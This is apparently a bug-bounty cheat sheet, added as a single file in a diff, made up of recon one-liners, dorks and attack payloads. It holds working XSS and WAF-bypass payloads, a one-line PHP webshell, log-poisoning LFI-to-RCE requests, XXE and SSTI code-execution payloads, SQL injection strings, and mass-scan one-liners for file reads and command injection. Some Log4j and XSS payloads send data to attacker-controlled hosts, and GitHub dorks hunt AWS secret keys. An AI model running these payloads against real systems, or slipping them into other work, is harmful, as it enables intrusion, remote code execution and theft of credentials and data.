@@ -1,0 +1,746 @@
+• To discover domains deployed on Github for subdomain takeover, 
+following google dork can be used
+
+1. intext:" There isn't a Github Pages site here" and
+2. not found • GitHub Pages"
+
+Collect XSS vulnerable parameters from entire domain.
+> python3 collector.py  pull --host http://testphp.vulnweb.com/
+
+'XSS' Sucuri WAF Payload Payload :
+1/4script3/4alert(¢xss¢)1/4/script3/4
+
+Fuzzing Recon 
+ffuf master command:
+ffuf -u https://target(.)com/ffuf -w (wordlistlocation) 
+Payload to use: seclists, onelistforall
+
+> ffuf -u https://target.com/FUZZ -w /root/Desktop/wordlistlocationfile.txt (fuzzing)
+
+> cat urls.txt | gf upload-fields| tee upload-fields.txt (upload-fieldsss vulnerable endpoints)
+> cat urls.txt | gf sqli| tee sqli.txt (sqli vulnerable endpoints)
+> cat urls.txt | gf rce| tee rce.txt (rce vulnerable endpoints)
+
+> cat gau.txt wayback.txt | sort -u | fff | tee urls.txt (sorting)
+> cat urls.txt | gf xss | tee xss.txt (xss vulnerable endpoints)
+> cat urls.txt | gf ssrf| tee ssrf.txt (ssrf vulnerable endpoints)
+
+> cat liveSubdomains.txt | aquatone (taking screenshot of subdomains)
+> cat liveSubdomains.txt | gau | tee gau.txt (fetching urls 1)
+> cat liveSubdomains.txt | waybackurls | tee wayback.txt (fetching urls 2)
+
+> amass enum — passive -d http://target.com | tee amass.txt (subdomain enum 3)
+> cat subf.txt ast.txt amass.txt | sort -u | tee subdomains.txt (sorting sudomains)
+> cat subdomains.txt | httpx | tee liveSubdomains.txt (filtering live subdomains)
+
+Important Commands Used in Bug Bounty (1/n) 
+> subfinder -d http://target.com | tee subf.txt (subdomain enumeration 1)
+> assetfinder -subs-only http://target.com | tee ast.txt (subdomain enum 2)
+
+tips:
+=> subfinder -d target(.)com | assetfinder --subs-only target(.)com | sort -u | httpx | tee subdomains.txt
+=> cat subdomains.txt | aquatone
+=> cat subdomains.txt | waybackurls | tee urls.txt
+=> ffuf -u target(.)com/FUZZ -w wordlist.txt -mc 200
+
+Tricks:
+-assetfinder -subs-only target(.)com > ast.txt
+-subfinder -d target(.)com >subf.txt
+-cat ast.txt subf.txt > subdomains.txt
+-cat subdomains.txt | httpx > live.txt
+-cat live.txt | waybackurls > urls.txt
+-cat live.txt | aquatone
+
+Summary Cmd for Bug Bounty Recon
+--
+i) subfinder -d websiteName | httpx | sort -u | tee subdomains.txt
+iii) cat subdomains.txt | aquatone
+ii) cat subdomains.txt | gau > urls.txt
+
+[ Subdomain Enumeration Done ]
+
+i) cat livesubdomains.txt | waybackurls > wayback.txt
+ii) cat livesubdomains.txt | gau > gau.txt
+iii) cat wayback.txt gau.txt | sort -u >> urls.txt
+
+[ Now using some grep cmd ]
+cat urls.txt | grep url= [ for ssrf ]
+cat urls.txt | grep id= [ for idor ]
+------------------------------------------------------------
+Tips for bug bounty hunters (Linux System)
+-------
+Use this:
+For Screenshot: Shutter Tool 
+==>Download via this cmd: "apt-get install shutter"
+
+For Screenrecording: Kazam Tool
+==>Download via this cmd: "apt-get install kazam"
+
+Easy 403 Bypass
+-----
+Try This:
+http://website/admin ==> 403
+http://website//admin// ==> 200
+
+Confused in finding websites for bug bounties?
+Search these on google:
+--
+->  inurl:security intext:"reward bug bounty"
+->  inurl:"responsible disclosure" intext:"$ reward"
+--> inurl:"security" intext:"bounty reward"
+
+[ Using ffuf cmd ]
+ffuf -w wordlist.txt -u subdomain..com/FUZZ -mc 200
+
+[ Web Spidering Done ]
+
+1. Use waybackurls to get all possible url's: cat target.txt | waybackurls | tee urls.txt 
+2. Use GF tool to filter SQL parameters & save as any.txt: cat any.txt | gf sql > any.txt
+3. Send filtered url's to Sqlmap - python http://sqlmap.py -m any.txt --batch
+
+Find hidden params in javascript files
+assetfinder *.com | gau | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"
+
+#bugbountytips
+1. assetfinder --subs-only http://target.com | httprobe | tee domainstarget.txt
+2. cat domainstarget.txt | waybackurls | tee waytarget.txt
+
+bounty cmds for hackers
+1. assetfinder http://target.com | tee target.txt--assetfinder
+2. cat target.txt | httprobe | tee target1.txt--httprobe
+3. cat target1.txt | waybackurls | tee urls.txt--wybckurls
+4. cat urls.txt | gf xss | tee gf.txt--gf tool
+
+Gold Bug Bounty Cmd!
+1. subfinder -d http://target.com | httpx | tee domain.txt
+2. cat domain.txt | gau | tee urls.txt
+3. cat urls.txt | grep ".js"
+Enjoy the endpoints!
+
+Oneliner XSS at scale 
+cat domainlist.txt | subfinder | dnsx | waybackurl | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | uro  | dalfox pipe -b http://your.xss.ht -o xss.txt
+
+subfinder -silent -d domain | anew subdomains.txt | httpx -silent | anew urls.txt | hakrawler | anew endpoints.txt | while read url; do curl $url --insecure | haklistgen | anew wordlist.txt; done
+cat subdomains.txt urls.txt endpoints.txt | haklistgen | anew wordlist.txt; 
+
+echo "domain" | subfinder -silent | gauplus | grep "=" | uro | gf xss | awk '{ print "curl https://knoxss[.]me/api/v3 -d \"target="$1 "\" -H \"X-API-KEY: APIKNOXSS\""}' | sh
+
+curl --location --request POST 'http://127.0.0.1:8080/demo' \
+--header 'Content-Type: application/x-www-form-urlencoded' \
+--data-urlencode 'keyword=T(java.lang.String).forName('\''java.lang.Runtime'\'').getRuntime().exec('\''whoami\'')
+
+Sucuri #WAF #Bypass
+#XSS (POST only)
+PoC:
+data:text/html,<form action=https://brutelogic.com.br/xss-waf.php method=post><input type=hidden name=a value="<K Contenteditable Autofocus OnFocusIn=[1].map(alert)>"><input type=submit value=XSS></form>
+
+Shodan Dorks for Finding Sensitive Data
+➡"MongoDB Server Information" port:27017 -authentication
+➡"authentication disabled" "RFB 003.008"
+➡"X-Jenkins" "Set-Cookie: JSESSIONID" http.title:"Dashboard"
+➡"Set-Cookie: mongo-express=" "200 OK"
+
+gau target[.]tld --threads 20 --subs | sed -e 's/=[^&]*/=FUZZ/g'
+
+Achieving LFI to RCE
+
+1. Apache Log Poisoning
+
+GET /show.php?file=/var/log/apache2/access.log&c=ls HTTP/1.1
+User-Agent: <?php system($_GET['c'])?>
+2. SSH Log Poisoning
+ssh '<?php system($_GET['c'])?>'
+@target.com
+/show.php?file=/var/log/auth.log&c=ls
+
+Add a SSTI payload to your Blind XSS payload, if you are lucky, you have a visual internal SSTI in a critical endpoint.
+${{48*53}}`'";--><sCRIpt sRc=//your.oob></sCRIpt>
+
+
+----------------------------------------
+“><script>alert(document.domain)</script>
+
+Creative New XSS Payload:
+<script>
+c=document,h=c.head,x=h.part,p=g=h.id,h.valueOf=p.sub,x.valueOf=p.at,o=g++,l=g++,z=g++,e=g++,a=g++,s=g++,d=g++,j=g++,b=g++,h.part=h+p,y=h.innerHTML=x+p,h.part=h.innerHTML,p+=x,h.part=c.nodeName,p+=x,k=o+p,u=l+p,w=p+l,t=w+l,f=w+o+b+w,h.innerHTML=t+s+t+d+w+z+l+f+o+u+a+j+t+l+t+o+f+l+u+g+j+w+o+k+d+l,h.innerHTML=y+h.innerHTML+p+g+j+f+o+l+t+a+w+l+d+p+a+k+s+k+s+u+a+u+a+j+p+a+j+h
+</script>
+
+cat domains.txt | assetfinder -subs-only | httpx -nc -silent -p 80,443,8080,8443 -fr -t 50 -fc 404,400,500  | katana -jc  -c 30 -nc -silent | dalfox pipe --silence  
+
+Lets automate it 🔥🔥
+cat rootDomains.txt | assetfinder subs-only | httpx -p 80,443,8080,8443,9000 -nc -silent > hosts.txt; katana -list hosts.txt -nc -silent -c 50 | nuclei -t <YOUR_TEMPLATES>
+
+cat rootDomains.txt | assetfinder -subs-only | httpx -nc -silent -p 80,443,8080,8443,9000,9001,9002,9003 -path "/static/js////../../../../etc/passwd"  -mr "root:x"
+
+Port Scan, Probe and Directory Brute Force with HTTPX 🔥🔥🔥
+cat domains | httpx -nc -silent -p 80,443,8080,8443,9000,9001,9002,9003 -path wordlist.txt -fc 400,404,403 -title -content-length -ip -status-code -server 
+
+Gather Domains from Content-Security-Policy 🔥🔥🔥
+curl -vs URL --stderr - | awk '/^content-security-policy:/' | grep -Eo "[a-zA-Z0-9./?=_-]*" |  sed -e '/\./!d' -e '/[^A-Za-z0-9._-]/d' -e 's/^\.//' | sort -u
+
+Extract Juicy Info From AlienVault🔥🔥🔥🔥
+for sub in $(cat HOSTS.txt); do gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq | egrep -wi 'url' | awk '{print $2}' | sed 's/"//g'| sort -u | tee -a OUT.txt  ;done
+
+Make you scans faster 🔥🔥🔥🔥
+Ports Scan without CloudFlare  🔥🔥🔥🔥
+subfinder -silent -d HOST | filter-resolved | cf-check | sort -u | naabu -rate 40000 -silent -verify | httprobe
+
+CORS Misconfigs at scale 🔥🔥🔥🔥
+ gau "$site" | while read url; do target=$(curl -sIH "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS] echo $url; else echo Nothing "$url"; fi; done
+
+Dump Custom URLs from ParamSpider 🔥🔥🔥
+cat rootDomains.txt | assetfinder -subs-only | xargs -I % python3 http://paramspider.py -l high -o ./OUT/% -d %;
+
+Using FFUF as a Subdomain Bruteforcer 🔥🔥🔥🔥 
+ffuf -u https://FUZZ.HOST -w FILE.txt -v | grep "| URL |" | awk '{print $4}'
+
+Lets automate it 🔥🔥🔥🔥🔥🔥
+cat rootDomains.txt | assetfinder -subs-only | httpx -H "Accept: ../../../../../../../../etc/passwd{{" -t 50 -nc -silent -p 80,443,8080,8443,9000,9001,9002,9003 -mr "root:x" 
+
+CVE-2020-5902 🔥🔥🔥🔥
+cat file | while read h do ;do curl -s --path-as-is -k "https://$h/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$h \033[0;31mVuln\n" || printf "$h \033[0;32mNot Vuln\n";done
+
+Gospider 🔥🔥🔥🔥🔥🔥
+Fast web spider written in Go   🔥🔥🔥
+Usage: gospider -S sites.txt -o output -c 10 -d 1 -t 20
+
+Automate Subdomain Takeover 🔥🔥🔥🔥
+subfinder -d HOST >> FILE; amass enum -norecursive -noalts -d HOST >> FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/haccer/subjack/fingerprints.json -v 3 ; 
+
+Cookie LFI At Scale 🔥🔥🔥
+cat rootDomains.txt | assetfinder -subs-only | httpx -t 60 -nc -p 80,443,8080,8443,9001,9002,9002,9003 -H "Cookie:usid=../../../../../../../../../../../../etc/passwd" -mc 200 -mr "root:x:"
+
+How to find local file read vulnerabilities based on cookies.
+
+Request
+GET /vulnerable.php HTTP/1.1
+Cookie:usid=../../../../../../../../../../../../../etc/pasdwd
+
+Response
+HTTP/1.1 200 OK 
+...
+Server: Apache root:fi3sER6:0:1:System Operator:/:/bin/ksh//
+
+Wavlink WN530HG4  Password Disclosure 🔥🔥🔥
+cat rootDomains.txt | assetfinder -subs-only | httpx -path "/set_safety.shtml?r=52300" -silent -nc -p 443,80,8443,8080,9000,9001,9002,9003,8888 -t 80 -mr "var syspasswd="
+
+Quick recon 🔥🔥🔥
+subfinder -d target. com | httprobe -c 100 | aquatone -out ~aquatone/target 
+
+Check every screenshot for interesting subdomains.
+found one? Fuzz it 🔥🔥🔥
+ffuf -w wordlist.txt -u https:// sub .target. com/FUZZ -c -v 
+
+Tricky LFI at scale 🔥🔥🔥🔥    
+cat roots.txt | assetfinder -subs-only | httpx -nc -silent -p 80,443,8080,8443,8088,9000,9001,9002,9003 -path "/../../../../../../../../etc/random/../password" -mr "root:x" 
+
+LFI at scale 🔥🔥🔥🔥
+cat rootsDomains.txt | waybackurls | qsreplace ".%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./etc/passwd" | httpx -silent -nc -mr "root:x:" -t 250 
+
+SQLI one liner 🔥🔥🔥🔥
+cat rootDomains.txt | waybackurls > wayback_urls_for_target.txt ; python3 sqli_detector wayback_urls_for_target.txt
+
+
+SQLI at scale 🔥🔥🔥🔥
+cat rootDomains.txt  | assetfinder -only-subs | httpx -nc -silent -t 80 -p 80,443,8443,8080,8088,8888,9000,9001,9002,9003 -path "/app_dev.php/1'%20%22" -mr "An exception occurred"
+
+Admin console access at scale 🔥🔥🔥
+cat hosts.txt | httpx -ports 80,443,8080,8443,8090 -path /web-console/ -status-code -title -nc -t 250 -mc 200 
+
+Naabu's Host Discovery 🔥🔥🔥🔥
+cat rootsDomain.txt | assetfinder -subs-only | naabu -sn -silent -nc -t 80 -p 80,443,8080,8443,8090,9000,9001,9002,9003 | aquatone -out aquatone_screenshots 
+
+XSS at scale 🔥🔥🔥🔥
+cat rootDomains.txt | assetfinder -no-subs | waybackurls | grep -Ev "\.(jpeg|jpg|png|ico)$" | uro | grep =  | qsreplace "<img src=x onerror=alert(1)>" | httpx -silent -nc -c 200 -mr "<img src=x onerror=alert(1)>"
+
+Blind XSS at scale 🔥🔥🔥
+cat roots.txt | waybackurls | httpx -H "User-Agent: \"><script src=$YOUR_XSS_HUNTER></script>" 
+
+Quick recon in a one liner 🔥🔥🔥
+cat rootDomains.txt | assetfinder | httprobe -c 50 --prefer-https -p http:80 http:8080 https:443 https:8443 http:9000 http:9001 http:9002 http:9003 | aquatone  -out screenshots -threads 50
+
+Nmap reconnaissance for the win 🔥🔥🔥
+nmap --script default,safe,discovery -p 80,443,8080,8443,9000,9001,9002,9003,8888,8088,8880,3000 -n -T4  -iL hosts.txt -oN output
+
+Lets find some criticals at scale 🔥🔥🔥
+cat hosts | httpx -nc -t 300 -p 80,443,8080,8443,8888,8088 -path "/jobmanager/logs/..%252f..%252f..%252f......%252f..%252fetc%252fpasswd"  -mr "root:x" -silent
+
+Nice one! Lets automate it 🔥🔥
+cat targets.txt | assetfinder -subs-only | httpx -silent -p 80,443,8080,8443,9000,9001,9002,9003 -nc  | nuclei -t severity high -silent | tee -a BugsFound.txt
+
+Looking for an easy win on your PHP code review ?
+here's a simple command to find easy XSS 🔥🔥🔥
+grep -Hir "echo.*\$_\(GET\|REQUEST\|POST\|\COOKIE\|SERVER\|FILES\)"
+
+Need to port scan for http services real quick and nmap's too slow? ffuf got ya covered. 
+Command: 
+seq 1 65535 | ffuf -w - -u https://target.com:FUZZ/ 
+
+OS Command Injection at scale 🔥🔥🔥🔥
+cat hosts | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent 
+
+SQL Injection at scale 🔥🔥🔥
+cat roots | assetfinder |  httpx -silent | waybackurls | tee -a potential.txt ;  gf sqli potential.txt >> sqli.txt ; sqlmap -m sqli.txt --dbs --batch --risk 3 --level 3
+
+LFI AT SCALE 🔥🔥 🔥🔥
+cat hosts | gau |  gf lfi |  httpx  -paths lfi_wordlist.txt -threads 100 -random-agent -x GET,POST  -tech-detect -status-code  -follow-redirects -mc 200 -mr "root:[x*]:0:0:"
+
+Easy XSS At Scale 🔥🔥
+cat hosts | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/?name={{this.constructor.constructor('alert(\"foo\")')()}}" -mr "name={{this.constructor.constructor('alert(" 
+
+Nice one liner! 🔥🔥
+Here it is: 
+cat hosts | while read host do; do curl -sk "https://$host/mgmt/shared/authn/login" | grep -q 'resterrorresponse' && printf "$host \0331;41mF5 iControl REST API Exposed\e[0m\n"; done
+
+Finding criticals at scale ? we out here 🔥🔥🔥
+cat roots | waybackurls | httpx -silent -mc 401,403 -t 250 -silent -nc  | ffuf -w - -u FUZZ?access=all -mc 200
+
+Easy XSS anyone ? 🔥
+cat hosts.txt | ffuf -w - -u "FUZZ/sign-in?next=javascript:alert(1);" -mr "javascript:alert(1)" 
+
+Reflected Xss
+
+parameter:
+/sign-in?next=
+known payload: javascript:alert(1);
+
+Automate Local File Inclusion (LFI)
+gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+
+How to find this LFI at scale using @pdiscoveryio's httpx? 
+cat hosts | httpx -nc -t 250 -p 80,443,8080,8443,4443,8888 -path "///////../../../etc/passwd" -mr "root:x" | anew myP1s.txt
+
+Automate Server-side Template Injection (more details in thread):
+cat sstipatterns.txt | xargs -P 50 -I host bash -c "curl -s -L 'host' | grep \"check-ssti49\" && echo -e \"[VULNERABLE] - host \n \"" | grep "VULNERABLE"
+
+Find potential sensitive leaked files (more details in thread):
+cat urls.txt | grep -iaE "(replace it with extensions in thread)" | httpx -silent -threads 300 -follow-redirects -mc 200
+
+Bypass Cloudflare XSS payload #copy
+"><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
+
+
+Automate Directory Path Traversal (more details in thread):
+cat lfipatterns.txt | xargs -P 50 -I host bash -c "curl -s -L 'host' | grep \"root:\" && echo -e \"[VULNERABLE] - host \n \"" | grep "VULNERABLE"
+
+echo http://target.com | waybackurls | gf ssti | anew -q ssti.txt
+cat payloads.txt | while read -r line; do cat ssti.txt | qsreplace "$line" | anew -q sstipatterns.txt;done
+
+When testing password fields, my preferred password is:
+%01%E2%80%AEalert%0D%0A
+
+Simple use 
+subfinder -d target | httpx | tee target.txt 
+cat target.txt | waybackurls | tee waybackdata
+cat waybackdata | grep “sensitive keywords” 
+cat subdomains.txt | waybackurls | tee waybackurls.txt | grep -E "\\.xls|\\.xlsx|\\.json|\\.pdf|\\.sql|\\.doc|\\.docx|\\.pptx"
+
+SQL INJECTION oneliner:
+findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1
+
+Smallest PHP webshell:
+<?=`$_GET[x]`?>
+
+WAF bypass payload
+<sVg/onfake="x=y"oNload=;1^(co\u006efirm)``^1//
+
+katana -u https://test.com -headless -jc -aff -kf -c 50 -fs dn
+
+Onliner for finding potential subdomain takeover using subzy and httpx.
+httpx -silent -l all_subdomain.txt | xargs | sed -e 's/ /,/g'  | xargs -I '{}' subzy -hide_fails -target {}
+
+Use 👇 bash one liner to extract #graphql embedded queries/mutations from js files.
+cat jsfile.js | nestle -regex '(query|mutation)\s+[a-zA-Z]+[0-9]*[a-zA-Z]+(\([^(\(|\))]+\))*\s*[{:nested:}]' | sed 's/\\n/\n/g'
+cat domain | subfinder -d | httpx -nc -t 300 -p 80,443,8080,8443,8090,9090 -silent | katana >> sqli;  sqlmap -m sqli --batch --random-agent --level 4
+
+How to use FFUF over multiple hosts
+$ for i in `cat host.txt`; do ffuf -u $i/FUZZ -w wordlist.txt -mc 200,302,401 -se ;done
+
+
+XSS Payloads
+a='aler';d=`'XSS'`;b='t('+d+')';c=a+b;eval(c);
+or
+a='aler';d='Math.PI';b='t('+d+')';c=a+b;eval(c);
+or
+a='aler';d=1;b='t('+d+')';c=a+b;eval(c);
+
+One Liner to crawl through Katana + Run Nuclei Templates
+cat rootDomains.txt | assetfinder subs-only | httpx -p 80,443,8080,8443,9000 -nc -silent > hosts.txt; katana -list hosts.txt -nc -silent -c 50 | nuclei -t <YOUR_TEMPLATES>
+
+One Liner to find Open Redirection Vulnerability
+waybackurls http://example.com | grep -a -i \=http | bhedak 'http://evil.com' | while read host do;do curl -s -L $host -I | grep "http://evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done
+
+XXE to Remote Code Execution:
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo
+  [<!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "expect://id" >]>
+<creds>
+  <user>`&xxe;`</user>
+  <pass>`mypass`</pass>
+</creds>
+
+
+Bypass 304 (Not Modified)
+Request :
+GET /admin HTTP/1.1
+Host: http://target.com
+If-None-Match: W/"32-IuK7rSIJ92ka0c92kld"
+➡Delete "If-None-Match" header
+➡Adding random character in the end of "If-None-Match" header
+
+One-line
+XSS:
+gospider -S URLS.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee OUT.txt
+
+
+Awesome One-liner Bug Bounty
+Local File Inclusion :
+gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+
+
+DNS Recon and Fuzzing with FFUF in one line
+curl -s http://crt.sh\?q\=\%.$1\&output\=json | jq -r '.[].name_value' | gsed 's/^/https:\/\//' | sort -u | xargs -n 1 -I{} ffuf -w ~/common.txt -u {}/FUZZ -t 70 > fuzzing_domain.txt
+
+One-liners 
+Scan All domains using Knoxss:
+echo "dominio" | subfinder -silent | gauplus | grep "=" | uro | gf xss | awk '{ print "curl http://knoxss.me/api/v3 -d \"target="$1 "\" -H \"X-API-KEY: APIDOKNOXSS\""}' | sh
+
+SQL Injection 101, Login tricks
+
+• admin' 
+• admin' # 
+• admin'/* 
+• ' or 1=1-- 
+• ' or 1=1# 
+• ' or 1=1/* 
+• ') or '1'='1-- 
+• ') or C11=11-- 
+
+
+Read local file :
+<script>
+x=new XMLHttpRequest;
+x.onload=function(){document.write(btoa(this.responseText))};
+http://x.open("GET","file:///etc/passwd");x.send();
+</script>
+
+
+RCE Parameters for newbie Bug-Bounty Hunters 
+-> ?cmd={payload}
+-> ?code={payload}
+-> ?execute={payload}
+-> ?feature={payload}
+-> ?ping={payload}
+-> ?load={payload}
+-> ?process={payload}
+-> ?req={payload}
+-> ?query={payload}
+
+#XSS PoC Styles
+Noob:
+alert(1)
+Bug Hunter:
+alert(document.domain)
+WAF Bypasser:
+d=document,b='`',d['loca'+'tion']='javascript&colon;aler'+'t'+b+domain+b
+Red Teamer:
+import('//X55.is/wp')
+
+SSRF (curl-based)
+?url=https://brutelogic.com.br/poc.svg
+SSRF (PHP file_get_contents)
+?url=data:,<svg/onload=alert(1)
+SQLi (error-based)
+?id='<svg/onload=alert(1)>\
+
+SSTI to RCE payload 
+{{_self.env.registerUndefinedFilterCallback("exec")}}
+{{_self.env.getFilter("cat /home/min/user.txt")}}
+
+cat domains.txt | assetfinder -subs-only | httpx -nc -silent -p 80,443,8080,8443 -fr -t 50 -fc 404,400,500  | katana -jc  -c 30 -nc -silent | dalfox pipe --silence  
+
+New CloudFlare XSS Bypass! 
+<svg onload=alert%26%230000000040"1")>
+
+Two best Katana commands
+cat httpx.txt | katana -jc -d 5 -c 50 -ef css,woff,woff2,eot,ttf,tiff,tif -kf robotstxt,sitemapxml | grep -v -e "=" >> paths.txt
+cat httpx.txt | katana -jc -f qurl -d 5 -c 50 -kf robotstxt,sitemapxml >> fuzzingparameters.txt
+
+One-ish liner for #Log4J #RCE 
+cat hosts.txt | sed 's/https\?:\/\///' | xargs -I {} echo '{}/${jndi:ldap://{}.attacker.burpcollaborator.net}' >> log4j.txt
+httpx -l log4j.txt 
+Look for callbacks in your server. It should be VICTIM.ATTACKER.burpcollab
+
+Log4j Cloudflare bypass :
+${jndi:dns://aeutbj.example.com/ext}
+${jndi:${lower:l}${lower:d}a${lower:p}://example.com/
+
+Achieving LFI to RCE
+1. Apache Log Poisoning
+GET /show.php?file=/var/log/apache2/access.log&c=ls HTTP/1.1
+User-Agent: <?php system($_GET['c'])?>
+2. SSH Log Poisoning
+ssh '<?php system($_GET['c'])?>'
+@target.com
+/show.php?file=/var/log/auth.log&c=ls
+(1/n)
+
+ffuf -recursion -mc all -ac -c -e .htm,.shtml,.php,.html,.js,.txt,.zip,.bak,.asp,.aspx,.xml,.sql,.old,.at,.inc -w path -u https://target.com/FUZZ -t 5000
+
+A quick one-liner that will gather + crawl all subdomains, then convert to a custom wordlist unique to that organization based on discovered URLs 👇🏽 👇🏽 👇🏽 
+subfinder -d bugcrowd[.]com -silent | httpx -silent | hakrawler -plain | tr "[:punct:]" "\n" | sort -u 
+
+Find hidden params in javascript files
+assetfinder *.com | gau | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"
+
+Command Injection:
+~Find Your subdomains 
+~cat subdomains.txt | httpx | gau | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt
+~ ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
+~search for ”uid” in burp proxy intercept 
+
+
+If you find 401 Unauthorized, try to test with SQLmap 
+sqlmap -u $url --forms --crawl=2 --dbs --ignore-code=401
+--->Bypassed
+
+Akamai XSS WAF bypass. Working in all browsers.
+"><a/\test="%26quot;x%26quot;"href='%01javascript:/*%b1*/;location.assign("//hackerone.com/stealthy?x="+location)'>Click
+
+Brute #XSS Polyglot
+
+JavaScript://%250Aalert?.(1)//
+'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!-->
+</Title/</Style/</Script/</textArea/</iFrame/</noScript>
+\74k<K/contentEditable/autoFocus/OnFocus=
+/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
+
+🚨 Google Dork 🚨
+site:"" intext:\"sql syntax near\" | intext:\"syntax error has occurred\" | intext:\"incorrect syntax near\" | intext:\"unexpected end of SQL command\" | intext:\"Warning: mysql_connect()\" | intext:\"Warning: mysql_query()\" | intext:\"Warning: pg_connect()\"
+
+XSS through Automation
+-echo "https://target.com" | gau | gf XSS > xss.txt
+-cat xss.txt | qsreplace -a > xssdupremoved.txt
+-cat xssdupremoved.txt | dalfox pipe
+
+Blind Time Based Sql Injection
+Detection Payload:
+'XOR(if(now()=sysdate(),sleep(5*1),0))OR'
+Sqlmap Command (Firewall bypass command)
+http://sqlmap.py -r 1.txt -p "value" -v 3 --level=5 --risk=3 --time-sec=15 --tamper=between --current-db --no-cast
+
+cat subs.txt | waybackurl > wayback
+cat subs.txt | gau > wayback2
+cat subs.txt | hakrawler -depth 3 -plain > wayback3
+cat wayback wayback2 wayback3 | sort -u > wayback_full
+cat wayback_full | dalfox pipe -o result.txt
+
+org:Target "bucket_name"
+org:Target "aws_access_key"
+org:Target "aws_secret_key"
+org:Target "S3_BUCKET"
+org:Target "S3_ACCESS_KEY_ID"
+org:Target "S3_SECRET_ACCESS_KEY"
+org:Target "S3_ENDPOINT"
+org:Target  "AWS_ACCESS_KEY_ID"
+org:Target  "list_aws_accounts"
+
+RCE WAF Bypass
+;+$u+cat+/etc$u/passwd$u
+;+$u+cat+/etc$u/passwd+\#
+/???/??t+/???/??ss??
+/?in/cat+/et?/passw?
+
+Another XSS Filter Bypass Payload:
+&quot;&gt;&lt;iframe/onload=aaaaajavascript&amp;colon;alert&amp;lpar;document&amp;period;domain&amp;rpar;//
+
+site:http://sharecode.io "company"
+site:http://pastebin.com "company"
+site:http://repl.it "company"
+site:http://productforums.google.com "company"
+site:http://gitter.im "company"
+site:http://bitbucket.org "company"
+site:*.atlassian.net "company"
+
+The Best XSS Polyglot! 🚨🚨
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+Detect Blind SQL INJECTION with these payloads
+0"XOR(if(now()=sysdate(),sleep(12),0))XOR"Z%20=%3E
+0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z
+'%20WAITFOR%20DELAY%20'0:0:5'--
+if(now()=sysdate(),sleep(3),0)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+python3 knock.py -u exmaple.com
+python3 dirsearch.py -u example.com /usr/share/seclist/common.txt
+
+
+Get Only Live Hosts
+while read domain; do if host “$domain” > /dev/null; then echo $domain;fi;done<DutchGov.txt >> domains.txt
+
+Get All Subdomain
+for sub in $(cat domains.txt);do subfinder -d $sub -o $sub.dutch;done
+
+Gather All Subdomain
+cat *.dutch > all.sub
+
+Fuzz All The Things
+for i in $(cat all.sub); do echo””; echo “Subdomain of $i”;echo “”;gobuster dir -w wordlist.txt -u $i -e -o tmp ;cat tmp >> dutch.fuzz; echo “”; done
+
+Server Details for CVE
+for sub in $(cat all.sub);do echo “[*] Domain Name is => “ $sub;echo “[*] Server Header is => “ $(http — verify=no -h $sub | grep Server);echo “ “;done
+
+Scan Ports well when i was doing i have done this process with nmap manually, i only scanned those hosts where i found juicy staff during previous steps But now there lots of fast scanner available to automate this process. I didn’t check them yet, so do some research yourself
+
+Web ScreensShot I already have visited all of those sites so no need for me, but you can try
+
+Wayback Machine Urls
+cat domains.txt | waybackurls | urlprobe -t 50 -c 100 | grep “=”
